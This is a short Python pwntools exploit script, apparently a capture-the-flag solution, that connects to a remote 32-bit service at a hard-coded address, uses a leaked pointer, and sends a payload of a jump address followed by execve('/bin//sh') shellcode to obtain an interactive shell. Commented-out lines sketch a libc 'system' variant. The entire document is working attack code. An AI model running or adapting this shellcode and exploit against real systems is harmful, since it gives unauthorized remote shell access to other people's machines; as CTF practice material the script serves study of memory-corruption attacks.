from pwn import *
import time

local = False

if local:
	HOST, PORT = '0.0.0.0', 31337
	libc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	HOST, PORT = '52.199.49.117', 10003
	libc_elf = ELF('/lib32/libc.so.6')
r = remote(HOST, PORT)

ptr = int(r.recvline(), 16)
r.sendline('4')
r.sendline('0')
r.sendline('3')
time.sleep(0.5)
code = "\x31\xC9\xF7\xE1\x51\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x51\x53\x89\xE1\xB0\x0B\xCD\x80"
payload = p32(ptr + 4) + code
# payload = p32(0x80487e9) + p32(0x8048715) + p32(0x8048784)
r.sendline(payload)
time.sleep(0.5)
r.sendline('1')
# r.recvuntil('0x')
# libc = int(r.recvline(), 16) + 0x8048ff8
# r.sendline('4')
# r.sendline('0')
# r.sendline('3')
# time.sleep(0.5)
# system = libc + 0x3ada0
# payload = p32(system + 1) * 5
r.interactive()